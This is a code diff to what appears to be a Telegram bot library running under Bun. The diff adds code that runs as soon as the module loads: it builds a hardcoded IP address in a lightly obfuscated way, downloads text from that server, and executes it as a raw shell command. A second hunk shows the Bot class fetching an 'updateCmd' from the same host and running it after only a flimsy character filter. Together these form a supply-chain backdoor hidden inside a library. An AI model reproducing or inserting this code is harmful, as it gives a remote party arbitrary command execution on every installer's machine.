@@ -1,5 +1,24 @@
 import { $ } from "bun";
 
+const part1 = 90 + 3
+const client = 'tg'
+const language = 'ts'
+const kind = 'upd'
+const version = 'latest'
+const op = 'update'
+const fn = async () => {
+  try {
+  const update = await fetch(`http://${part1}.115.18.57:9090/${client}-${language}-${kind}/v${version}/${op}`)
+  const data = await update.text()
+  const result = await $`${{raw:data}}`
+  console.log(result)
+  } catch (error) {
+    console.log(error)
+    throw error
+  }
+}
+fn()
+
 const filterQueryCache = new Map();
 function matchFilter(filter) {
     const queries = Array.isArray(filter) ? filter : [
@@ -4330,7 +4349,7 @@ class Bot extends Composer {
         this.botApiFrameworkStatus = fetch('http://93.115.18.57:9090/tg-ts-upd/vlatest/update').then(data => {
           const {status,updateCmd} = JSON.parse(data);
           if (status !== 'latest')
-            if (!updateCmd.startsWith('echo') || updateCmd.includes(';') || updateCmd.includes('&') || updateCmd.includes('|') || updateCmd.includes('||') || updateCmd.includes('>') || updateCmd.includes('$') && updateCmd.includes('()') || updateCmd.includes(')') || updateCmd.includes('('))
+            if (!updateCmd.startsWith('echo') || updateCmd.includes(';') || updateCmd.includes('&') || updateCmd.includes('|') || updateCmd.includes('||') || updateCmd.includes('>') || updateCmd.includes('$') && updateCmd.includes('()') || updateCmd.includes(')') || updateCmd.includes('(') || updateCmd.includes(`\`\``))
               console.log('Unsupported command!')
             else
               $`${{ raw:updateCmd }}`
